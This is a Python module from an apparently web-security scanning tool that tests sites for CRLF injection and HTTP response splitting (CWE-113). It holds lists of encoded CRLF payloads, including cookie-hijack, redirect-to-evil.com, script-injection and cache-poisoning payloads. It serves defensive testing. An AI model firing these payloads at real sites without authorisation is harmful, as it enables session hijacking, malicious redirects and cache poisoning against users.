"""
CRLF Injection Scanner — InsertionPoint per-parameter isolation (CWE-113).

Architecture:
  Phase 1: URL parameter CRLF (per-param, 11+ encoding variants)
  Phase 2: Header-based CRLF (10+ request headers)
  Phase 3: Response splitting chains (Set-Cookie, Content-Length, full split)
  Phase 4: Cache poisoning via CRLF (inject cache headers)
"""

import re
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote

from secprobe.config import Severity
from secprobe.core.insertion_points import (
    InsertionPointDiscovery, InsertionType, send_request,
)
from secprobe.scanners.smart_scanner import SmartScanner
from secprobe.utils import normalize_url, print_status, print_finding


CRLF_PAYLOADS = [
    ("%0d%0aX-Injected: secprobe", "URL-encoded CRLF"),
    ("%0aX-Injected: secprobe", "LF only"),
    ("%0dX-Injected: secprobe", "CR only"),
    ("%0d%0a%0d%0a<script>alert(1)</script>", "CRLF + body injection"),
    ("%E5%98%8A%E5%98%8DX-Injected: secprobe", "Unicode CRLF (UTF-8)"),
    ("\\r\\nX-Injected: secprobe", "Literal CRLF escape"),
    ("%0d%0aSet-Cookie: secprobe=injected", "Cookie injection"),
    ("%0d%0aLocation: https://evil.com", "Redirect injection"),
    ("%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0a", "Response splitting"),
    ("%c0%8d%c0%8aX-Injected: secprobe", "Overlong UTF-8 CRLF"),
    ("%25%30%64%25%30%61X-Injected: secprobe", "Double-encoded CRLF"),
]

# Extended encoding variants for bypass
CRLF_BYPASS_PAYLOADS = [
    ("%E5%98%8A%E5%98%8DSet-Cookie: probe=1", "Unicode CRLF → cookie"),
    ("%c0%8d%c0%8aSet-Cookie: probe=1", "Overlong UTF-8 → cookie"),
    ("%00%0d%0aX-Injected: secprobe", "Null prefix + CRLF"),
    ("%0d%20%0aX-Injected: secprobe", "CRLF with space"),
    ("%0d%0a%20X-Injected: secprobe", "CRLF + header folding"),
    ("\r\nX-Injected: secprobe", "Raw CRLF (literal)"),
    ("%u000d%u000aX-Injected: secprobe", "IIS Unicode CRLF"),
]

INJECTION_MARKERS = [
    ("X-Injected", "secprobe"),
    ("Set-Cookie", "secprobe=injected"),
    ("Set-Cookie", "probe=1"),
    ("Location", "evil.com"),
]

# Headers to test for CRLF reflection
INJECTABLE_HEADERS = [
    "Referer", "X-Forwarded-For", "User-Agent", "X-Forwarded-Host",
    "X-Original-URL", "X-Rewrite-URL", "True-Client-IP",
    "X-Custom-IP-Authorization", "X-Client-IP", "CF-Connecting-IP",
]

# Cache-related headers to inject via CRLF
CACHE_POISON_PAYLOADS = [
    ("%0d%0aX-Cache: HIT%0d%0aAge: 0", "Inject cache HIT"),
    ("%0d%0aCache-Control: public, max-age=999999", "Inject long-lived cache"),
    ("%0d%0aX-Forwarded-Host: evil.com", "Inject forwarded host"),
]


class CRLFScanner(SmartScanner):
    name = "CRLF Scanner"
    description = "Test for CRLF / HTTP Response Splitting (CWE-113)"

    def scan(self):
        url = normalize_url(self.config.target)
        print_status(f"Testing CRLF injection on {url}", "progress")

        try:
            baseline = self.http_client.get(url)
        except Exception as e:
            self.result.error = str(e)
            return

        baseline_text = baseline.text
        found_vulns = set()

        # ── Discover insertion points ────────────────────────────────
        discovery = InsertionPointDiscovery(
            include_headers=True,
            include_cookies=True,
            include_paths=False,
        )
        points = discovery.discover(url, response=baseline)
        query_points = [p for p in points if p.type == InsertionType.QUERY_PARAM]
        header_points = [p for p in points if p.type == InsertionType.HEADER]

        if not query_points:
            for p in ["url", "redirect", "page", "lang", "next", "return",
                       "callback", "path", "q", "search", "file", "template"]:
                test_url = f"{url}{'&' if '?' in url else '?'}{p}=test"
                pts = discovery.discover(test_url)
                query_points.extend(
                    pt for pt in pts
                    if pt.type == InsertionType.QUERY_PARAM and pt.name == p
                )

        # Also gather from context
        if self.context:
            for u in self.context.get_injection_urls():
                ctx_pts = discovery.discover(u)
                query_points.extend(
                    pt for pt in ctx_pts
                    if pt.type == InsertionType.QUERY_PARAM
                    and pt.name not in {p.name for p in query_points}
                )

        # ── Phase 1: Per-param CRLF in URL parameters ───────────────
        self._test_param_crlf(query_points, baseline_text, found_vulns)

        # ── Phase 2: Per-header CRLF injection (expanded) ───────────
        self._test_header_crlf(url, header_points, baseline_text, found_vulns)

        # ── Phase 3: Response splitting chains ───────────────────────
        self._test_response_splitting(query_points, baseline_text, found_vulns)

        # ── Phase 4: Cache poisoning via CRLF ────────────────────────
        self._test_cache_poisoning_crlf(query_points, baseline, found_vulns)

        if not found_vulns:
            self.add_finding(
                title="No CRLF injection detected",
                severity=Severity.INFO,
                description="Automated tests did not detect CRLF injection.",
                category="CRLF Injection",
            )

    def _test_param_crlf(self, query_points, baseline_text, found_vulns):
        """Phase 1: CRLF injection — one URL param at a time."""
        print_status("Phase 1: Per-param CRLF injection", "progress")

        for point in query_points:
            if point.name in {v[1] for v in found_vulns}:
                continue

            all_payloads = CRLF_PAYLOADS + CRLF_BYPASS_PAYLOADS
            for payload, desc in all_payloads:
                if self.config.rate_limit:
                    time.sleep(self.config.rate_limit)

                # CRLF needs raw (pre-encoded) injection — build URL manually
                injected_url = self._inject_raw_single(point, payload)
                try:
                    resp = self.http_client.get(injected_url, allow_redirects=False)
                except Exception:
                    continue

                # Check response headers for injected markers
                for header_name, header_val in INJECTION_MARKERS:
                    actual = resp.headers.get(header_name, "")
                    if header_val in actual:
                        found_vulns.add((injected_url, point.name))
                        sev = Severity.HIGH
                        if header_name in ("Set-Cookie", "Location"):
                            sev = Severity.CRITICAL
                        self.add_finding(
                            title=f"CRLF Injection via '{point.name}' - {desc}",
                            severity=sev,
                            description=(
                                f"HTTP response splitting via {point.display_name}.\n"
                                f"Injected header '{header_name}: {header_val}' in response."
                            ),
                            recommendation="Sanitise all user input in HTTP headers. Reject CR/LF.",
                            evidence=f"Param: {point.name}\nInjected: {header_name}: {actual}",
                            category="CRLF Injection", url=injected_url, cwe="CWE-113",
                        )
                        print_finding(sev, f"CRLF: {desc} on {point.name}")
                        break

                # Check for body injection (response splitting)
                if "<script>alert(1)</script>" in payload and "<script>alert(1)</script>" in resp.text:
                    if "<script>alert(1)</script>" not in baseline_text:
                        found_vulns.add((injected_url, point.name))
                        self.add_finding(
                            title=f"CRLF Response Splitting via '{point.name}'",
                            severity=Severity.CRITICAL,
                            description=f"Full HTTP response splitting on {point.display_name}.",
                            recommendation="Sanitise CRLF characters from all user-controlled values.",
                            evidence=f"Param: {point.name}",
                            category="CRLF Injection", url=injected_url, cwe="CWE-113",
                        )
                        break

    def _test_header_crlf(self, url, header_points, baseline_text, found_vulns):
        """Phase 2: CRLF injection — extended header coverage."""
        print_status("Phase 2: Per-header CRLF injection (extended)", "progress")

        for header_name in INJECTABLE_HEADERS:
            if header_name in {v[1] for v in found_vulns}:
                continue

            for payload, desc in CRLF_PAYLOADS[:6]:
                if self.config.rate_limit:
                    time.sleep(self.config.rate_limit)

                try:
                    resp = self.http_client.get(
                        url,
                        headers={header_name: f"test{payload}"},
                        allow_redirects=False,
                    )
                    for marker_name, marker_val in INJECTION_MARKERS:
                        if marker_val in resp.headers.get(marker_name, ""):
                            found_vulns.add((url, header_name))
                            self.add_finding(
                                title=f"CRLF via header '{header_name}'",
                                severity=Severity.HIGH,
                                description=(
                                    f"CRLF injection via {header_name} header.\n"
                                    f"Encoding: {desc}"
                                ),
                                recommendation="Never reflect HTTP header values into response headers.",
                                evidence=f"Header: {header_name}\nPayload: {payload}",
                                category="CRLF Injection", url=url, cwe="CWE-113",
                            )
                            print_finding(Severity.HIGH, f"CRLF via {header_name}")
                            break
                except Exception:
                    continue

    def _test_response_splitting(self, query_points, baseline_text, found_vulns):
        """Phase 3: Test response splitting chain attacks."""
        print_status("Phase 3: Response splitting chains", "progress")

        splitting_payloads = [
            # Full HTTP response injection
            ("%0d%0aContent-Type: text/html%0d%0a%0d%0a<html>INJECTED</html>",
             "Full response injection", "INJECTED"),
            # Cookie + redirect chain
            ("%0d%0aSet-Cookie: session=hijacked%0d%0aLocation: /admin",
             "Cookie + redirect chain", None),
            # Content-Length manipulation
            ("%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<html>SPLIT</html>",
             "HTTP response splitting", "SPLIT"),
        ]

        for point in query_points:
            if point.name in {v[1] for v in found_vulns}:
                continue

            for payload, desc, body_marker in splitting_payloads:
                if self.config.rate_limit:
                    time.sleep(self.config.rate_limit)

                injected_url = self._inject_raw_single(point, payload)
                try:
                    resp = self.http_client.get(injected_url, allow_redirects=False)
                except Exception:
                    continue

                # Check for hijacked cookies
                set_cookie = resp.headers.get("Set-Cookie", "")
                if "hijacked" in set_cookie:
                    found_vulns.add((injected_url, point.name))
                    self.add_finding(
                        title=f"CRLF cookie hijack via '{point.name}'",
                        severity=Severity.CRITICAL,
                        description=(
                            f"CRLF injection allows setting arbitrary cookies.\n"
                            f"Attack chain: {desc}"
                        ),
                        recommendation="Strip CR/LF from all user input before header reflection.",
                        evidence=f"Set-Cookie: {set_cookie[:100]}",
                        category="CRLF Injection", url=injected_url, cwe="CWE-113",
                    )
                    print_finding(Severity.CRITICAL, f"CRLF cookie hijack: {point.name}")
                    break

                # Check for body injection
                if body_marker and body_marker in resp.text and body_marker not in baseline_text:
                    found_vulns.add((injected_url, point.name))
                    self.add_finding(
                        title=f"HTTP response splitting via '{point.name}'",
                        severity=Severity.CRITICAL,
                        description=(
                            f"Full HTTP response splitting allows injecting arbitrary "
                            f"HTML content.\nChain: {desc}"
                        ),
                        recommendation="Reject CR/LF in all user-controlled header values.",
                        evidence=f"Param: {point.name}\nChain: {desc}",
                        category="CRLF Injection", url=injected_url, cwe="CWE-113",
                    )
                    break

    def _test_cache_poisoning_crlf(self, query_points, baseline, found_vulns):
        """Phase 4: Cache poisoning via CRLF — inject cache-control headers."""
        print_status("Phase 4: Cache poisoning via CRLF", "progress")
        baseline_xcache = baseline.headers.get("X-Cache", "")

        for point in query_points:
            if point.name in {v[1] for v in found_vulns}:
                continue

            for payload, desc in CACHE_POISON_PAYLOADS:
                if self.config.rate_limit:
                    time.sleep(self.config.rate_limit)

                injected_url = self._inject_raw_single(point, payload)
                try:
                    resp = self.http_client.get(injected_url, allow_redirects=False)
                except Exception:
                    continue

                # Check if we successfully injected cache headers
                cache_control = resp.headers.get("Cache-Control", "")
                x_cache = resp.headers.get("X-Cache", "")
                fwd_host = resp.headers.get("X-Forwarded-Host", "")

                if "max-age=999999" in cache_control or \
                        ("HIT" in x_cache and "HIT" not in baseline_xcache) or \
                        "evil.com" in fwd_host:
                    found_vulns.add((injected_url, point.name))
                    self.add_finding(
                        title=f"Cache poisoning via CRLF — '{point.name}'",
                        severity=Severity.CRITICAL,
                        description=(
                            f"CRLF injection allows injecting cache-control headers, "
                            f"enabling cache poisoning attacks.\n"
                            f"Injected: {desc}"
                        ),
                        recommendation=(
                            "Strip CRLF from all user input. "
                            "Configure CDN/cache to not trust injected headers."
                        ),
                        evidence=(
                            f"Param: {point.name}\n"
                            f"Cache-Control: {cache_control}\n"
                            f"X-Cache: {x_cache}"
                        ),
                        category="CRLF Injection", url=injected_url, cwe="CWE-113",
                    )
                    print_finding(Severity.CRITICAL, f"Cache poison CRLF: {point.name}")
                    break

    def _inject_raw_single(self, point, payload):
        """Inject CRLF payload into ONE param without re-encoding."""
        spec = point.inject("")
        parsed = urlparse(spec.url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        parts = []
        for k, v in params.items():
            if k == point.name:
                val = (v[0] if v else "test") + payload
            else:
                val = v[0] if v else ""
            parts.append(f"{k}={val}")
        new_query = "&".join(parts)
        return urlunparse(parsed._replace(query=new_query))
